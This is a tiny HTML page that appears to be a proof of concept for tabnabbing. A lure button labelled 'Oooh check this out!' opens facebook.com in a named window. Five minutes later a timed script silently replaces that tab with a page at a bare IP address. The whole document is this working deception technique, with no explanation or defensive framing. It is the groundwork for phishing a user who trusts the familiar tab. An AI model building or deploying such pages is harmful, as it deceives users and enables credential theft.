<html>
<script>
    var windowHijack = function(){
        window.open('https://facebook.com', 'test');
        setTimeout(function(){window.open('http://139.59.130.165', 'test');}, 300000);
    }
</script>
<body>
<button onclick="windowHijack()">Oooh check this out!</button>
</body>
